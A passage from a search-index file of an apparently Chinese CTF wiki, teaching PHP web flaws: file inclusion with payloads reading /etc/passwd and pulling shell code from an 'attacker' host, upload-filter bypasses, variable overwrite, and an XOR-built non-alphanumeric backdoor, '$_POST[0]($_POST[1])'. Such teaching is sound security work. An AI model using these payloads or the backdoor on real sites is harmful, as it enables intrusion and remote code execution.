\u5305\u542b\u4e00\u4e2a\u6587\u4ef6\u65f6\uff0c\u4f1a\u5c06\u8be5\u6587\u4ef6\u5f53\u505a PHP \u4ee3\u7801\u6267\u884c\uff0c\u800c\u4e0d\u4f1a\u5728\u610f\u6587\u4ef6\u65f6\u4ec0\u4e48\u7c7b\u578b\u3002","title":"\u6587\u4ef6\u5305\u542b"},{"location":"web/php/php/#_2","text":"\u672c\u5730\u6587\u4ef6\u5305\u542b\uff0cLocal File Inclusion\uff0cLFI\u3002 <?php $file = $_GET [ 'file' ]; if ( file_exists ( '/home/wwwrun/' . $file . '.php' )) { include '/home/wwwrun/' . $file . '.php' ; } ?> \u4e0a\u8ff0\u4ee3\u7801\u5b58\u5728\u672c\u5730\u6587\u4ef6\u5305\u542b\uff0c\u53ef\u7528 %00 \u622a\u65ad\u7684\u65b9\u5f0f\u8bfb\u53d6 /etc/passwd \u6587\u4ef6\u5185\u5bb9\u3002 %00 \u622a\u65ad ?file=../../../../../../../../../etc/passwd%00 \u9700\u8981 magic_quotes_gpc=off \uff0cPHP \u5c0f\u4e8e 5.3.4 \u6709\u6548\u3002 \u8def\u5f84\u957f\u5ea6\u622a\u65ad ?file=../../../../../../../../../etc/passwd/././././././.[\u2026]/./././././. Linux \u9700\u8981\u6587\u4ef6\u540d\u957f\u4e8e 4096\uff0cWindows \u9700\u8981\u957f\u4e8e 256\u3002 \u70b9\u53f7\u622a\u65ad ?file=../../../../../../../../../boot.ini/\u2026\u2026\u2026[\u2026]\u2026\u2026\u2026\u2026 \u53ea\u9002\u7528 Windows\uff0c\u70b9\u53f7\u9700\u8981\u957f\u4e8e 256\u3002","title":"\u672c\u5730\u6587\u4ef6\u5305\u542b"},{"location":"web/php/php/#_3","text":"\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\uff0cRemote File Inclusion\uff0cRFI\u3002 <?php if ( $route == \"share\" ) { require_once $basePath . \"/action/m_share.php\" ; } elseif ( $route == \"sharelink\" ) { require_once $basePath . \"/action/m_sharelink.php\" ; } \u6784\u9020\u53d8\u91cf basePath \u7684\u503c\u3002 /?basePath=http://attacker/phpshell.txt? \u6700\u7ec8\u7684\u4ee3\u7801\u6267\u884c\u4e86 require_once \"http://attacker/phpshell.txt?/action/m_share.php\"; \u95ee\u53f7\u540e\u7684\u90e8\u5206\u88ab\u89e3\u91ca\u4e3a URL \u7684 querystring\uff0c\u8fd9\u4e5f\u662f\u4e00\u79cd\u300c\u622a\u65ad\u300d\u3002 \u666e\u901a\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b ?file=[http|https|ftp]://example.com/shell.txt \u9700\u8981 allow_url_fopen=On \u5e76\u4e14 allow_url_include=On \u3002 \u5229\u7528 PHP \u6d41 input ?file=php://input \u9700\u8981 allow_url_include=On \u3002 \u5229\u7528 PHP \u6d41 filter ?file=php://filter/convert.base64-encode/resource=index.php \u9700\u8981 allow_url_include=On \u3002 \u5229\u7528 data URIs ?file=data://text/plain;base64,SSBsb3ZlIFBIUAo= \u9700\u8981 allow_url_include=On \u3002 \u5229\u7528 XSS \u6267\u884c ?file=http://127.0.0.1/path/xss.php?xss=phpcode \u9700\u8981 allow_url_fopen=On \uff0c allow_url_include=On \u5e76\u4e14\u9632\u706b\u5899\u6216\u8005\u767d\u540d\u5355\u4e0d\u5141\u8bb8\u8bbf\u95ee\u5916\u7f51\u65f6\uff0c\u5148\u5728\u540c\u7ad9\u70b9\u627e\u4e00\u4e2a XSS \u6f0f\u6d1e\uff0c\u5305\u542b\u8fd9\u4e2a\u9875\u9762\uff0c\u5c31\u53ef\u4ee5\u6ce8\u5165\u6076\u610f\u4ee3\u7801\u4e86\u3002","title":"\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b"},{"location":"web/php/php/#_4","text":"\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u662f\u6307\u7528\u6237\u4e0a\u4f20\u4e86\u4e00\u4e2a\u53ef\u6267\u884c\u811a\u672c\u6587\u4ef6\uff0c\u5e76\u901a\u8fc7\u6b64\u6587\u4ef6\u83b7\u5f97\u4e86\u6267\u884c\u670d\u5668\u7aef\u547d\u4ee4\u7684\u80fd\u529b\u3002\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u4e00\u822c\u662f\u6307\u4e0a\u4f20 WEB \u811a\u672c\u80fd\u591f\u88ab\u670d\u52a1\u5668\u89e3\u6790\u7684\u95ee\u9898\uff0c\u4e5f\u5c31\u662f\u6240\u8c13\u7684 webshell \u95ee\u9898\u3002\u5b8c\u6210\u8fd9\u4e00\u653b\u51fb\u9700\u8981\u8fd9\u6837\u51e0\u4e2a\u6761\u4ef6\uff0c\u4e00\u662f\u4e0a\u4f20\u7684\u6587\u4ef6\u80fd\u591f\u88ab WEB \u5bb9\u5668\u6267\u884c\uff0c\u5176\u6b21\u7528\u6237\u80fd\u4ece WEB \u4e0a\u8bbf\u95ee\u8fd9\u4e2a\u6587\u4ef6\uff0c\u6700\u540e\uff0c\u5982\u679c\u4e0a\u4f20\u7684\u6587\u4ef6\u88ab\u5b89\u5168\u68c0\u67e5\u3001\u683c\u5f0f\u5316\u3001\u56fe\u7247\u538b\u7f29\u7b49\u529f\u80fd\u6539\u53d8\u4e86\u5185\u5bb9\uff0c\u5219\u53ef\u80fd\u5bfc\u81f4\u653b\u51fb\u5931\u8d25\u3002","title":"\u6587\u4ef6\u4e0a\u4f20"},{"location":"web/php/php/#_5","text":"\u524d\u7aef\u68c0\u67e5\u6269\u5c55\u540d \u6293\u5305\u7ed5\u8fc7\u5373\u53ef\u3002 Content-Type \u68c0\u6d4b\u6587\u4ef6\u7c7b\u578b \u6293\u5305\u4fee\u6539 Content-Type \u7c7b\u578b\uff0c\u4f7f\u5176\u7b26\u5408\u767d\u540d\u5355\u89c4\u5219\u3002 \u670d\u52a1\u7aef\u6dfb\u52a0\u540e\u7f00 \u5c1d\u8bd5 %00 \u622a\u65ad\u3002 \u670d\u52a1\u7aef\u6269\u5c55\u540d\u68c0\u6d4b \u5229\u7528\u89e3\u6790\u6f0f\u6d1e\u3002 Apache \u89e3\u6790 Apache \u5bf9\u540e\u7f00\u89e3\u6790\u662f\u4ece\u53f3\u5411\u5de6\u7684 phpshell.php.rar.rar.rar.rar \u56e0\u4e3a Apache \u4e0d\u8ba4\u8bc6 .rar \u8fd9\u4e2a\u6587\u4ef6\u7c7b\u578b\uff0c\u6240\u4ee5\u4f1a\u4e00\u76f4\u904d\u5386\u540e\u7f00\u5230 .php \uff0c\u7136\u540e\u8ba4\u4e3a\u8fd9\u662f\u4e00\u4e2a PHP \u6587\u4ef6\u3002 IIS \u89e3\u6790 IIS 6 \u4e0b\u5f53\u6587\u4ef6\u540d\u4e3a abc.asp;xx.jpg \u65f6\uff0c\u4f1a\u5c06\u5176\u89e3\u6790\u4e3a abc.asp \u3002 PHP CGI \u8def\u5f84\u89e3\u6790 \u5f53\u8bbf\u95ee http://www.a.com/path/test.jpg/notexist.php \u65f6\uff0c\u4f1a\u5c06 test.jpg \u5f53\u505a PHP \u89e3\u6790\uff0c notexist.php \u662f\u4e0d\u5b58\u5728\u7684\u6587\u4ef6\u3002\u6b64\u65f6 Nginx \u7684\u914d\u7f6e\u5982\u4e0b location ~ \\.php$ { root html ; fastcgi_pass 127.0.0.1 : 9000 ; fastcgi_index index.php ; fastcgi_param SCRIPT_FILENAME /scripts $fastcgi_script_name ; include fastcgi_param ; } \u5176\u4ed6\u65b9\u5f0f \u540e\u7f00\u5927\u5c0f\u5199\u3001\u53cc\u5199\u3001\u7279\u6b8a\u540e\u7f00\u5982 php5 \u7b49\uff0c\u4fee\u6539\u5305\u5185\u5bb9\u7684\u5927\u5c0f\u5199\u8fc7 WAF \u7b49\u3002","title":"\u7ed5\u8fc7\u4e0a\u4f20\u68c0\u67e5"},{"location":"web/php/php/#_6","text":"","title":"\u53d8\u91cf\u8986\u76d6"},{"location":"web/php/php/#_7","text":"\u53d8\u91cf\u5982\u679c\u672a\u88ab\u521d\u59cb\u5316\uff0c\u4e14\u80fd\u591f\u88ab\u7528\u6237\u6240\u63a7\u5236\uff0c\u90a3\u4e48\u5f88\u53ef\u80fd\u4f1a\u5bfc\u81f4\u5b89\u5168\u95ee\u9898\u3002 register_globals = ON \u793a\u4f8b <?php echo \"Register_globals: \" . ( int ) ini_get ( \"register_globals\" ) . \"<br/>\" ; if ( $auth ) { echo \"private!\" ; } ?> \u5f53 register_globals=ON \u65f6\uff0c\u63d0\u4ea4 test.php?auth=1 \uff0c auth \u53d8\u91cf\u5c06\u81ea\u52a8\u5f97\u5230\u8d4b\u503c\u3002","title":"\u5168\u5c40\u53d8\u91cf\u8986\u76d6"},{"location":"web/php/php/#extract","text":"extract() \u51fd\u6570\u80fd\u591f\u5c06\u53d8\u91cf\u4ece\u6570\u7ec4\u5bfc\u5165\u5230\u5f53\u524d\u7684\u7b26\u53f7\u8868\uff0c\u5176\u5b9a\u4e49\u4e3a int extract ( array $var_array [, int $extract_type [, string $prefix ]] ) \u5176\u4e2d\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u6307\u5b9a\u51fd\u6570\u5c06\u53d8\u91cf\u5bfc\u5165\u7b26\u53f7\u8868\u65f6\u7684\u884c\u4e3a\uff0c\u6700\u5e38\u89c1\u7684\u4e24\u4e2a\u503c\u662f EXTR_OVERWRITE \u548c EXTR_SKIP \u3002 \u5f53\u503c\u4e3a EXTR_OVERWRITE \u65f6\uff0c\u5728\u5c06\u53d8\u91cf\u5bfc\u5165\u7b26\u53f7\u8868\u7684\u8fc7\u7a0b\u4e2d\uff0c\u5982\u679c\u53d8\u91cf\u540d\u53d1\u751f\u51b2\u7a81\uff0c\u5219\u8986\u76d6\u6240\u6709\u53d8\u91cf\uff1b\u503c\u4e3a EXTR_SKIP \u5219\u8868\u793a\u8df3\u8fc7\u4e0d\u8986\u76d6\u3002\u82e5\u7b2c\u4e8c\u4e2a\u53c2\u6570\u672a\u6307\u5b9a\uff0c\u5219\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4f7f\u7528 EXTR_OVERWRITE \u3002 <?php $auth = \"0\" ; extract ( $_GET ); if ( $auth == 1 ) { echo \"private!\" ; } else { echo \"public!\" ; } ?> \u5f53 extract() \u51fd\u6570\u4ece\u7528\u6237\u53ef\u4ee5\u63a7\u5236\u7684\u6570\u7ec4\u4e2d\u5bfc\u51fa\u53d8\u91cf\u65f6\uff0c\u53ef\u80fd\u53d1\u751f\u53d8\u91cf\u8986\u76d6\u3002","title":"extract() \u53d8\u91cf\u8986\u76d6"},{"location":"web/php/php/#import_request_variables","text":"bool import_request_variables (string $types [, string $prefix]) import_request_variables \u5c06 GET\u3001POST\u3001Cookies \u4e2d\u7684\u53d8\u91cf\u5bfc\u5165\u5230\u5168\u5c40\uff0c\u4f7f\u7528\u8fd9\u4e2a\u51fd\u6570\u53ea\u7528\u7b80\u5355\u5730\u6307\u5b9a\u7c7b\u578b\u5373\u53ef\u3002 <?php $auth = \"0\" ; import_request_variables ( \"G\" ); if ( $auth == 1 ) { echo \"private!\" ; } else { echo \"public!\" ; } ?> import_request_variables(\"G\") \u6307\u5b9a\u5bfc\u5165 GET \u8bf7\u6c42\u4e2d\u7684\u53d8\u91cf\uff0c\u63d0\u4ea4 test.php?auth=1 \u51fa\u73b0\u53d8\u91cf\u8986\u76d6\u3002","title":"import_request_variables \u53d8\u91cf\u8986\u76d6"},{"location":"web/php/php/#parse_str","text":"void parse_str ( string $str [, array &$arr ]) parse_str() \u51fd\u6570\u901a\u5e38\u7528\u4e8e\u89e3\u6790 URL \u4e2d\u7684 querystring\uff0c\u4f46\u662f\u5f53\u53c2\u6570\u503c\u53ef\u4ee5\u88ab\u7528\u6237\u63a7\u5236\u65f6\uff0c\u5f88\u53ef\u80fd\u5bfc\u81f4\u53d8\u91cf\u8986\u76d6\u3002 // var.php?var=new \u53d8\u91cf\u8986\u76d6 $var = \"init\"; parse_str($_SERVER[\"QUERY_STRING\"]); print $var; \u4e0e parse_str() \u7c7b\u4f3c\u7684\u51fd\u6570\u8fd8\u6709 mb_parse_str() \u3002","title":"parse_str() \u53d8\u91cf\u8986\u76d6"},{"location":"web/php/php/#_8","text":"","title":"\u547d\u4ee4\u6267\u884c"},{"location":"web/php/php/#_9","text":"PHP \u4e2d\u6709\u4e0d\u5c11\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u4ee3\u7801\u7684\u51fd\u6570\u3002 eval(); assert(); system(); exec(); shell_exec(); passthru(); escapeshellcmd(); pcntl_exec(); ......","title":"\u76f4\u63a5\u6267\u884c\u4ee3\u7801"},{"location":"web/php/php/#preg_replace","text":"preg_replace() \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u5982\u679c\u5b58\u5728 /e \u6a21\u5f0f\u4fee\u9970\u7b26\uff0c\u5219\u5141\u8bb8\u4ee3\u7801\u6267\u884c\u3002 <?php $var = \"<tag>phpinfo()</tag>\" ; preg_replace ( \"/<tag>(.*?)<\\/tag>/e\" , \"addslashes( \\\\ 1)\" , $var ); ?> \u5982\u679c\u6ca1\u6709 /e \u4fee\u9970\u7b26\uff0c\u53ef\u4ee5\u5c1d\u8bd5 %00 \u622a\u65ad\u3002","title":"preg_replace() \u4ee3\u7801\u6267\u884c"},{"location":"web/php/php/#preg_match","text":"preg_match \u6267\u884c\u7684\u662f\u5339\u914d\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u5982\u679c\u5339\u914d\u6210\u529f\uff0c\u5219\u5141\u8bb8\u4ee3\u7801\u6267\u884c\u3002 <?php include 'flag.php'; if(isset($_GET['code'])){ $code = $_GET['code']; if(strlen($code)>40){ die(\"Long.\"); } if(preg_match(\"/[A-Za-z0-9]+/\",$code)){ die(\"NO.\"); } @eval($code); }else{ highlight_file(__FILE__); } //$hint = \"php function getFlag() to get flag\"; ?> \u8fd9\u9053\u9898\u662f xman \u8bad\u7ec3\u8d5b\u7684\u65f6\u5019\uff0c\u6885\u5b50\u9152\u5e08\u5085\u51fa\u7684\u4e00\u9053\u9898\u3002\u8fd9\u4e00\u4e32\u4ee3\u7801\u63cf\u8ff0\u662f\u8fd9\u6837\u5b50\uff0c\u6211\u4eec\u8981\u7ed5\u8fc7 A-Z \u3001 a-z \u3001 0-9 \u8fd9\u4e9b\u5e38\u89c4\u6570\u5b57\u3001\u5b57\u6bcd\u5b57\u7b26\u4e32\u7684\u4f20\u53c2\uff0c\u5c06\u975e\u5b57\u6bcd\u3001\u6570\u5b57\u7684\u5b57\u7b26\u7ecf\u8fc7\u5404\u79cd\u53d8\u6362\uff0c\u6700\u540e\u80fd\u6784\u9020\u51fa a-z \u4e2d\u4efb\u610f\u4e00\u4e2a\u5b57\u7b26\uff0c\u5e76\u4e14\u5b57\u7b26\u4e32\u957f\u5ea6\u5c0f\u4e8e 40 \u3002\u7136\u540e\u518d\u5229\u7528 PHP \u5141\u8bb8\u52a8\u6001\u51fd\u6570\u6267\u884c\u7684\u7279\u70b9\uff0c\u62fc\u63a5\u51fa\u4e00\u4e2a\u51fd\u6570\u540d\uff0c\u8fd9\u91cc\u6211\u4eec\u662f getFlag \uff0c\u7136\u540e\u52a8\u6001\u6267\u884c\u8be5\u4ee3\u7801\u5373\u53ef\u3002 \u90a3\u4e48\uff0c\u6211\u4eec\u9700\u8981\u8003\u8651\u7684\u95ee\u9898\u662f\u5982\u4f55\u901a\u8fc7\u5404\u79cd\u53d8\u6362\uff0c\u4f7f\u5f97\u6211\u4eec\u80fd\u591f\u53bb\u6210\u529f\u8bfb\u53d6\u5230 getFlag \u51fd\u6570\uff0c\u7136\u540e\u62ff\u5230 webshell \u3002 \u5728\u7406\u89e3\u8fd9\u4e2a\u4e4b\u524d\uff0c\u6211\u4eec\u9996\u5148\u9700\u8981\u5927\u5bb6\u4e86\u89e3\u7684\u662f PHP \u4e2d\u5f02\u6216 ^ \u7684\u6982\u5ff5\u3002 \u6211\u4eec\u5148\u770b\u4e00\u4e0b\u4e0b\u9762\u8fd9\u6bb5\u4ee3\u7801\uff1a <?php echo \"A\"^\"?\"; ?> \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b\uff1a \u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u8f93\u51fa\u7684\u7ed3\u679c\u662f\u5b57\u7b26 ~ \u3002\u4e4b\u6240\u4ee5\u4f1a\u5f97\u5230\u8fd9\u6837\u7684\u7ed3\u679c\uff0c\u662f\u56e0\u4e3a\u4ee3\u7801\u4e2d\u5bf9\u5b57\u7b26 A \u548c\u5b57\u7b26 ? \u8fdb\u884c\u4e86\u5f02\u6216\u64cd\u4f5c\u3002\u5728 PHP \u4e2d\uff0c\u4e24\u4e2a\u53d8\u91cf\u8fdb\u884c\u5f02\u6216\u65f6\uff0c\u5148\u4f1a\u5c06\u5b57\u7b26\u4e32\u8f6c\u6362\u6210 ASCII \u503c\uff0c\u518d\u5c06 ASCII \u503c\u8f6c\u6362\u6210\u4e8c\u8fdb\u5236\u518d\u8fdb\u884c\u5f02\u6216\uff0c\u5f02\u6216\u5b8c\uff0c\u53c8\u5c06\u7ed3\u679c\u4ece\u4e8c\u8fdb\u5236\u8f6c\u6362\u6210\u4e86 ASCII \u503c\uff0c\u518d\u5c06 ASCII \u503c\u8f6c\u6362\u6210\u5b57\u7b26\u4e32\u3002\u5f02\u6216\u64cd\u4f5c\u6709\u65f6\u4e5f\u88ab\u7528\u6765\u4ea4\u6362\u4e24\u4e2a\u53d8\u91cf\u7684\u503c\u3002 \u6bd4\u5982\u50cf\u4e0a\u9762\u8fd9\u4e2a\u4f8b\u5b50 A \u7684 ASCII \u503c\u662f 65 \uff0c\u5bf9\u5e94\u7684\u4e8c\u8fdb\u5236\u503c\u662f 01000001 ? \u7684ASCII\u503c\u662f 63 \uff0c\u5bf9\u5e94\u7684\u4e8c\u8fdb\u5236\u503c\u662f 00111111 \u5f02\u6216\u7684\u4e8c\u8fdb\u5236\u7684\u503c\u662f \u202d01111110\u202c \uff0c\u5bf9\u5e94\u7684 ASCII \u503c\u662f 126 \uff0c\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u7684\u503c\u5c31\u662f ~ \u4e86 \u6211\u4eec\u90fd\u77e5\u9053\uff0c PHP \u662f\u5f31\u7c7b\u578b\u7684\u8bed\u8a00\uff0c\u4e5f\u5c31\u662f\u8bf4\u5728 PHP \u4e2d\u6211\u4eec\u53ef\u4ee5\u4e0d\u9884\u5148\u58f0\u660e\u53d8\u91cf\u7684\u7c7b\u578b\uff0c\u800c\u76f4\u63a5\u58f0\u660e\u4e00\u4e2a\u53d8\u91cf\u5e76\u8fdb\u884c\u521d\u59cb\u5316\u6216\u8d4b\u503c\u64cd\u4f5c\u3002\u6b63\u662f\u7531\u4e8e PHP \u5f31\u7c7b\u578b\u7684\u8fd9\u4e2a\u7279\u70b9\uff0c\u6211\u4eec\u5bf9 PHP \u7684\u53d8\u91cf\u7c7b\u578b\u8fdb\u884c\u9690\u5f0f\u7684\u8f6c\u6362\uff0c\u5e76\u5229\u7528\u8fd9\u4e2a\u7279\u70b9\u8fdb\u884c\u4e00\u4e9b\u975e\u5e38\u89c4\u7684\u64cd\u4f5c\u3002\u5982\u5c06\u6574\u578b\u8f6c\u6362\u6210\u5b57\u7b26\u4e32\u578b\uff0c\u5c06\u5e03\u5c14\u578b\u5f53\u4f5c\u6574\u578b\uff0c\u6216\u8005\u5c06\u5b57\u7b26\u4e32\u5f53\u4f5c\u51fd\u6570\u6765\u5904\u7406\uff0c\u4e0b\u9762\u6211\u4eec\u6765\u770b\u4e00\u6bb5\u4ee3\u7801\uff1a <?php function B(){ echo \"Hello Angel_Kitty\"; } $_++; $__= \"?\" ^ \"}\"; $__(); ?> \u4ee3\u7801\u6267\u884c\u7ed3\u679c\u5982\u4e0b\uff1a \u6211\u4eec\u4e00\u8d77\u6765\u5206\u6790\u4e00\u4e0b\u4e0a\u9762\u8fd9\u6bb5\u4ee3\u7801\uff1a 1\u3001 $_++; \u8fd9\u884c\u4ee3\u7801\u7684\u610f\u601d\u662f\u5bf9\u53d8\u91cf\u540d\u4e3a \"_\" \u7684\u53d8\u91cf\u8fdb\u884c\u81ea\u589e\u64cd\u4f5c\uff0c\u5728 PHP \u4e2d\u672a\u5b9a\u4e49\u7684\u53d8\u91cf\u9ed8\u8ba4\u503c null \uff0c null==false==0 \uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u4e0d\u4f7f\u7528\u4efb\u4f55\u6570\u5b57\u7684\u60c5\u51b5\u4e0b\uff0c\u901a\u8fc7\u5bf9\u672a\u5b9a\u4e49\u53d8\u91cf\u7684\u81ea\u589e\u64cd\u4f5c\u6765\u5f97\u5230\u4e00\u4e2a\u6570\u5b57\u3002 2\u3001 $__=\"?\" ^ \"}\"; \u5bf9\u5b57\u7b26 ? \u548c } \u8fdb\u884c\u5f02\u6216\u8fd0\u7b97\uff0c\u5f97\u5230\u7ed3\u679c B \u8d4b\u7ed9\u53d8\u91cf\u540d\u4e3a __ (\u4e24\u4e2a\u4e0b\u5212\u7ebf)\u7684\u53d8\u91cf 3\u3001 $ __ (); \u901a\u8fc7\u4e0a\u9762\u7684\u8d4b\u503c\u64cd\u4f5c\uff0c\u53d8\u91cf $__ \u7684\u503c\u4e3a B \uff0c\u6240\u4ee5\u8fd9\u884c\u53ef\u4ee5\u770b\u4f5c\u662f B() \uff0c\u5728 PHP \u4e2d\uff0c\u8fd9\u884c\u4ee3\u7801\u8868\u793a\u8c03\u7528\u51fd\u6570 B \uff0c\u6240\u4ee5\u6267\u884c\u7ed3\u679c\u4e3a Hello Angel_Kitty \u3002\u5728 PHP \u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u5b57\u7b26\u4e32\u5f53\u4f5c\u51fd\u6570\u6765\u5904\u7406\u3002 \u770b\u5230\u8fd9\u91cc\uff0c\u76f8\u4fe1\u5927\u5bb6\u5982\u679c\u518d\u770b\u5230\u7c7b\u4f3c\u7684 PHP \u540e\u95e8\u5e94\u8be5\u4e0d\u4f1a\u90a3\u4e48\u8ff7\u60d1\u4e86\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7\u4e00\u53e5\u53e5\u7684\u5206\u6790\u540e\u95e8\u4ee3\u7801\u6765\u7406\u89e3\u540e\u95e8\u60f3\u5b9e\u73b0\u7684\u529f\u80fd\u3002 \u6211\u4eec\u5e0c\u671b\u4f7f\u7528\u8fd9\u79cd\u540e\u95e8\u521b\u5efa\u4e00\u4e9b\u53ef\u4ee5\u7ed5\u8fc7\u68c0\u6d4b\u7684\u5e76\u4e14\u5bf9\u6211\u4eec\u6709\u7528\u7684\u5b57\u7b26\u4e32\uff0c\u5982 _POST \uff0c system \uff0c call_user_func_array \uff0c\u6216\u8005\u662f\u4efb\u4f55\u6211\u4eec\u9700\u8981\u7684\u4e1c\u897f\u3002 \u4e0b\u9762\u662f\u4e2a\u975e\u5e38\u7b80\u5355\u7684\u975e\u6570\u5b57\u5b57\u6bcd\u7684 PHP \u540e\u95e8\uff1a <?php @$_++; // $_ = 1 $__=(\"#\"^\"|\"); // $__ = _ $__.=(\".\"^\"~\"); // _P $__.=(\"/\"^\"`\"); // _PO $__.=(\"|\"^\"/\"); // _POS $__.=(\"{\"^\"/\"); // _POST ${$__}[!$_](${$__}[$_]); // $_POST[0]($_POST[1]); ?> \u5728\u8fd9\u91cc\u6211\u8bf4\u660e\u4e0b\uff0c .= \u662f\u5b57\u7b26\u4e32\u7684\u8fde\u63a5\uff0c\u5177\u4f53\u53c2\u770b PHP \u8bed\u6cd5 \u6211\u4eec\u751a\u81f3\u53ef\u4ee5\u5c06\u4e0a\u9762\u7684\u4ee3\u7801\u5408\u5e76\u4e3a\u4e00\u884c\uff0c\u4ece\u800c\u4f7f\u7a0b\u5e8f\u7684\u53ef\u8bfb\u6027\u66f4\u5dee\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a $__=(\"#\"^\"|\").(\".\"^\"~\").(\"/\"^\"`\").(\"|\"^\"/\").(\"{\"^\"/\"); \u6211\u4eec\u56de\u5230 xman \u8bad\u7ec3\u8d5b\u7684\u90a3\u9898\u6765\u770b\uff0c\u6211\u4eec\u7684\u60f3\u6cd5\u662f\u901a\u8fc7\u6784\u9020\u5f02\u6216\u6765\u53bb\u7ed5\u8fc7\u90a3\u4e32\u5b57\u7b26\uff0c\u90a3\u4e48\u6211\u4eec\u8be5\u5982\u4f55\u6784\u9020\u8fd9\u4e2a\u5b57\u4e32\u4f7f\u5f97\u957f\u5ea6\u5c0f\u4e8e 40 \u5462\uff1f \u6211\u4eec\u6700\u7ec8\u662f\u8981\u8bfb\u53d6\u5230\u90a3\u4e2a getFlag \u51fd\u6570\uff0c\u6211\u4eec\u9700\u8981\u6784\u9020\u4e00\u4e2a _GET \u6765\u53bb\u8bfb\u53d6\u8fd9\u4e2a\u51fd\u6570\uff0c\u6211\u4eec\u6700\u7ec8\u6784\u9020\u4e86\u5982\u4e0b\u5b57\u7b26\u4e32\uff1a \u53ef\u80fd\u5f88\u591a\u5c0f\u4f19\u4f34\u770b\u5230\u8fd9\u91cc\u4ecd\u7136\u65e0\u6cd5\u7406\u89e3\u8fd9\u6bb5\u5b57\u7b26\u4e32\u662f\u5982\u4f55\u6784\u9020\u7684\u5427\uff0c\u6211\u4eec\u5c31\u5bf9\u8fd9\u6bb5\u5b57\u7b26\u4e32\u8fdb\u884c\u6bb5\u5206\u6790\u3002","title":"preg_match \u4ee3\u7801\u6267\u884c"},{"location":"web/php/php/#_get","text":"\u9996\u5148\u6211\u4eec\u5f97\u77e5\u9053 _GET \u7531\u4ec0\u4e48\u5f02\u6216\u800c\u6765\u7684\uff0c\u7ecf\u8fc7\u6211\u7684\u5c1d\u8bd5\u4e0e\u5206\u6790\uff0c\u6211\u5f97\u51fa\u4e86\u4e0b\u9762\u7684\u7ed3\u8bba\uff1a <?php echo \"`{{{\"^\"?<>/\";//_GET ?> \u8fd9\u6bb5\u4ee3\u7801\u4e00\u5927\u5768\u662f\u5565\u610f\u601d\u5462\uff1f\u56e0\u4e3a40\u4e2a\u5b57\u7b26\u957f\u5ea6\u7684\u9650\u5236\uff0c\u5bfc\u81f4\u4ee5\u524d\u9010\u4e2a\u5b57\u7b26\u5f02\u6216\u62fc\u63a5\u7684webshell\u4e0d\u80fd\u4f7f\u7528\u3002 \u8fd9\u91cc\u53ef\u4ee5\u4f7f\u7528php\u4e2d\u53ef\u4ee5\u6267\u884c\u547d\u4ee4\u7684\u53cd\u5f15\u53f7 ` \u548c Linux \u4e0b\u9762\u7684\u901a\u914d\u7b26 ? ? \u4ee3\u8868\u5339\u914d\u4e00\u4e2a\u5b57\u7b26 ` \u8868\u793a\u6267\u884c\u547d\u4ee4 \" \u5bf9\u7279\u6b8a\u5b57\u7b26\u4e32\u8fdb\u884c\u89e3\u6790 \u7531\u4e8e ? \u53ea\u80fd\u5339\u914d\u4e00\u4e2a\u5b57\u7b26\uff0c\u8fd9\u79cd\u5199\u6cd5\u7684\u610f\u601d\u662f\u5faa\u73af\u8c03\u7528\uff0c\u5206\u522b\u5339\u914d\u3002\u6211\u4eec\u5c06\u5176\u8fdb\u884c\u5206\u89e3\u6765\u770b\uff1a <?php echo \"{\"^\"<\"; ?> \u8f93\u51fa\u7ed3\u679c\u4e3a\uff1a <?php echo \"{\"^\">\"; ?> \u8f93\u51fa\u7ed3\u679c\u4e3a\uff1a <?php echo \"{\"^\"/\"; ?> \u8f93\u51fa\u7ed3\u679c\u4e3a\uff1a \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\uff0c _GET \u5c31\u662f\u8fd9\u4e48\u88ab\u6784\u9020\u51fa\u6765\u7684\u5566\uff01","title":"\u6784\u9020 _GET \u8bfb\u53d6"},{"location":"web/php/php/#_get_1","text":"\u6211\u4eec\u53c8\u8be5\u5982\u4f55\u83b7\u53d6 _GET \u53c2\u6570\u5462\uff1f\u54b1\u4eec\u53ef\u4ee5\u6784\u9020\u51fa\u5982\u4e0b\u5b57\u4e32\uff1a <?php echo ${$_}[_](${$_}[__]);//$_GET[_]($_GET[__]) ?> \u6839\u636e\u524d\u9762\u6784\u9020\u7684\u6765\u770b\uff0c $_ \u5df2\u7ecf\u53d8\u6210\u4e86 _GET \u3002\u987a\u7406\u6210\u7ae0\u7684\u6765\u8bb2\uff0c $_ = _GET \u3002\u6211\u4eec\u6784\u5efa $_GET[__] \u662f\u4e3a\u4e86\u8981\u83b7\u53d6\u53c2\u6570\u503c\u3002","title":"\u83b7\u53d6 _GET \u53c2\u6570"},{"location":"web/php/php/#_10","text":"\u6b64\u65f6\u6211\u4eec\u53ea\u9700\u8981\u53bb\u8c03\u7528 getFlag \u51fd\u6570\u83b7\u53d6 webshell \u5c31\u597d\u4e86\uff0c\u6784\u9020\u5982\u4e0b\uff1a <?php echo $_=getFlag;//getFlag ?> \u6240\u4ee5\u628a\u53c2\u6570\u5168\u90e8\u8fde\u63a5\u8d77\u6765\uff0c\u5c31\u53ef\u4ee5\u4e86\u3002 \u7ed3\u679c\u5982\u4e0b\uff1a \u4e8e\u662f\u6211\u4eec\u5c31\u6210\u529f\u5730\u8bfb\u53d6\u5230\u4e86flag\uff01","title":"\u4f20\u5165\u53c2\u6570"},{"location":"web/php/php/#_11","text":"\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u51fd\u6570\u53ef\u4ee5\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\u3002 <?php $dyn_func = $_GET [ \"dyn_func\" ]; $argument = $_GET [ \"argument\" ]; $dyn_func ( $argument ); 